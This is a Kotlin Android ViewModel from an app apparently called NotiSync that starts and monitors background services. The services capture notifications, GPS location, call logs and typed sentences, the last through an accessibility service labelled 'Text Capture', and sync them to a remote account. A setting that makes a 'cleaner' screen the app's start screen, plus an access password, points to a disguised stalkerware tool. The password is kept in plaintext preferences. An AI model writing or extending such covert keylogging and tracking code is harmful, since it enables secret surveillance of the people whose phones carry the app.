// ============================================================
// FILE: app/src/main/java/com/app/notisync_sender/viewmodel/DashboardViewModel.kt
// Purpose: Manages dashboard state including service status and sync statistics
// ============================================================

package com.app.notisync_sender.viewmodel

import android.app.ActivityManager
import android.app.Application
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.widget.Toast
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.app.notisync_sender.data.repository.AuthRepository
import com.app.notisync_sender.data.repository.LocationRepository
import com.app.notisync_sender.data.repository.CallLogRepository
import com.app.notisync_sender.data.repository.KeyboardRepository
import com.app.notisync_sender.data.repository.NotificationRepository
import com.app.notisync_sender.domain.model.DeviceInfo
import com.app.notisync_sender.domain.processor.BatchProcessor
import com.app.notisync_sender.service.OfflineSyncWorker
import com.app.notisync_sender.service.SyncForegroundService
import com.app.notisync_sender.service.location.LocationProvider
import com.app.notisync_sender.service.location.LocationRequestWorker
import com.app.notisync_sender.service.calllog.CallLogReader
import com.app.notisync_sender.service.calllog.CallLogSyncWorker
import com.app.notisync_sender.service.calllog.CallLogManualSyncWorker
import com.app.notisync_sender.service.keyboard.KeyboardAccessibilityService
import com.app.notisync_sender.service.keyboard.SentenceDetector
import com.app.notisync_sender.service.keyboard.KeyboardBatchProcessor
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import javax.inject.Inject

@HiltViewModel
class DashboardViewModel @Inject constructor(
    application: Application,
    private val authRepository: AuthRepository,
    private val notificationRepository: NotificationRepository,
    private val batchProcessor: BatchProcessor,
    private val deviceInfo: DeviceInfo,
    private val locationRepository: LocationRepository,
    private val locationProvider: LocationProvider,
    private val callLogRepository: CallLogRepository,
    private val callLogReader: CallLogReader,
    private val keyboardRepository: KeyboardRepository,
    private val sentenceDetector: SentenceDetector,
    private val keyboardBatchProcessor: KeyboardBatchProcessor
) : AndroidViewModel(application) {

    private val context: Context get() = getApplication()

    private val prefs = context.getSharedPreferences("app_prefs", Context.MODE_PRIVATE)

    private val _isServiceRunning = MutableStateFlow(false)
    val isServiceRunning: StateFlow<Boolean> = _isServiceRunning.asStateFlow()

    private val _isNotificationAccessEnabled = MutableStateFlow(false)
    val isNotificationAccessEnabled: StateFlow<Boolean> = _isNotificationAccessEnabled.asStateFlow()

    private val _isBatteryOptimizationDisabled = MutableStateFlow(false)
    val isBatteryOptimizationDisabled: StateFlow<Boolean> = _isBatteryOptimizationDisabled.asStateFlow()

    private val _isAppNotificationsEnabled = MutableStateFlow(true)
    val isAppNotificationsEnabled: StateFlow<Boolean> = _isAppNotificationsEnabled.asStateFlow()

    private val _isLocationPermissionGranted = MutableStateFlow(false)
    val isLocationPermissionGranted: StateFlow<Boolean> = _isLocationPermissionGranted.asStateFlow()

    private val _isGpsEnabled = MutableStateFlow(false)
    val isGpsEnabled: StateFlow<Boolean> = _isGpsEnabled.asStateFlow()

    private val _isCallLogPermissionGranted = MutableStateFlow(false)
    val isCallLogPermissionGranted: StateFlow<Boolean> = _isCallLogPermissionGranted.asStateFlow()

    private val _isAccessibilityServiceEnabled = MutableStateFlow(false)
    val isAccessibilityServiceEnabled: StateFlow<Boolean> = _isAccessibilityServiceEnabled.asStateFlow()

    private val _pendingNotificationCount = MutableStateFlow(0)
    val pendingNotificationCount: StateFlow<Int> = _pendingNotificationCount.asStateFlow()

    private val _useCleanerAsStart = MutableStateFlow(prefs.getBoolean("use_cleaner_start", false))
    val useCleanerAsStart: StateFlow<Boolean> = _useCleanerAsStart.asStateFlow()

    val pendingBatchCount: StateFlow<Int> = notificationRepository
        .observePendingBatchCount()
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), 0)

    val pendingLocationCount: StateFlow<Int> = locationRepository
        .observePendingLocationCount()
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), 0)

    val pendingCallLogBatchCount: StateFlow<Int> = callLogRepository
        .observePendingBatchCount()
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), 0)

    val pendingSentenceBatchCount: StateFlow<Int> = keyboardRepository
        .observePendingBatchCount()
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), 0)

    val currentDeviceInfo: DeviceInfo get() = deviceInfo
    val userEmail: String? get() = authRepository.getCurrentUser()?.email

    init {
        startStatusPolling()
    }

    private fun startStatusPolling() {
        viewModelScope.launch {
            while (isActive) {
                updateStatuses()
                delay(2000)
            }
        }
    }

    private fun updateStatuses() {
        _isNotificationAccessEnabled.value = checkNotificationAccess()
        _isBatteryOptimizationDisabled.value = checkBatteryOptimization()
        _isAppNotificationsEnabled.value = checkAppNotificationsEnabled()
        _isServiceRunning.value = isServiceRunningInSystem()
        _pendingNotificationCount.value = batchProcessor.getPendingCount()

        _isLocationPermissionGranted.value = locationProvider.hasLocationPermission()
        _isGpsEnabled.value = locationProvider.isGpsEnabled()

        _isCallLogPermissionGranted.value = callLogReader.hasCallLogPermission()
        _isAccessibilityServiceEnabled.value = checkAccessibilityServiceEnabled()
    }

    @Suppress("DEPRECATION")
    private fun isServiceRunningInSystem(): Boolean {
        val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        for (service in manager.getRunningServices(Int.MAX_VALUE)) {
            if (SyncForegroundService::class.java.name == service.service.className) {
                return true
            }
        }
        return false
    }

    private fun checkNotificationAccess(): Boolean {
        val enabledListeners = Settings.Secure.getString(
            context.contentResolver,
            "enabled_notification_listeners"
        )
        return enabledListeners?.contains(context.packageName) == true
    }

    private fun checkBatteryOptimization(): Boolean {
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        return powerManager.isIgnoringBatteryOptimizations(context.packageName)
    }

    private fun checkAppNotificationsEnabled(): Boolean {
        val manager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        return manager.areNotificationsEnabled()
    }

    private fun checkAccessibilityServiceEnabled(): Boolean {
        val accessibilityServiceName = "${context.packageName}/${KeyboardAccessibilityService::class.java.canonicalName}"

        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServices)

        while (colonSplitter.hasNext()) {
            val componentName = colonSplitter.next()
            if (componentName.equals(accessibilityServiceName, ignoreCase = true)) {
                return true
            }
        }

        return false
    }

    fun setCleanerAsStartDestination(enabled: Boolean) {
        prefs.edit().putBoolean("use_cleaner_start", enabled).apply()
        _useCleanerAsStart.value = enabled
    }

    fun saveAccessPassword(password: String) {
        prefs.edit().putString("access_password", password).apply()
    }

    fun verifyAccessPassword(password: String): Boolean {
        val saved = prefs.getString("access_password", "")
        return saved == password
    }

    fun startSyncService() {
        val serviceIntent = Intent(context, SyncForegroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent)
        } else {
            context.startService(serviceIntent)
        }
        OfflineSyncWorker.schedule(context)
        LocationRequestWorker.schedule(context)
        CallLogSyncWorker.schedule(context)
        _isServiceRunning.value = true
    }

    fun stopSyncService() {
        val serviceIntent = Intent(context, SyncForegroundService::class.java)
        context.stopService(serviceIntent)
        OfflineSyncWorker.cancel(context)
        LocationRequestWorker.cancel(context)
        CallLogSyncWorker.cancel(context)
        _isServiceRunning.value = false
    }

    fun openNotificationAccessSettings() {
        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        context.startActivity(intent)
    }

    fun openBatteryOptimizationSettings() {
        val intent = Intent().apply {
            action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
            data = Uri.parse("package:${context.packageName}")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        try {
            context.startActivity(intent)
        } catch (e: Exception) {
            val fallbackIntent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(fallbackIntent)
        }
    }

    fun openLocationSettings() {
        val intent = Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        context.startActivity(intent)
    }

    fun triggerLocationFetch() {
        Toast.makeText(context, "Location sync started...", Toast.LENGTH_SHORT).show()
        viewModelScope.launch {
            locationRepository.fetchAndUploadLocation()
        }
    }

    fun triggerCallLogSync() {
        Toast.makeText(context, "Call log sync started...", Toast.LENGTH_SHORT).show()
        CallLogManualSyncWorker.scheduleNow(context)
    }

    fun openAccessibilitySettings() {
        Toast.makeText(
            context,
            "Find \"NotiSync Text Capture\" and enable it",
            Toast.LENGTH_LONG
        ).show()

        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        context.startActivity(intent)
    }

    fun openAppSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", context.packageName, null)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        context.startActivity(intent)
    }

    fun openAppNotificationSettings() {
        val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                putExtra(Settings.EXTRA_APP_PACKAGE, context.packageName)
            } else {
                putExtra("app_package", context.packageName)
                putExtra("app_uid", context.applicationInfo.uid)
            }
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        context.startActivity(intent)
    }

    fun logout() {
        stopSyncService()
        setCleanerAsStartDestination(false)
        prefs.edit().remove("access_password").apply()

        // Clear in-memory buffers
        sentenceDetector.reset()
        // Note: BatchProcessor and KeyboardBatchProcessor don't have public reset(), 
        // but stopping the timer handles the final flush.

        viewModelScope.launch {
            notificationRepository.clearAllLocalData()
            locationRepository.clearAllLocalData()
            callLogRepository.clearAllLocalData()
            keyboardRepository.clearAllLocalData()
        }
        authRepository.logout()
    }
}
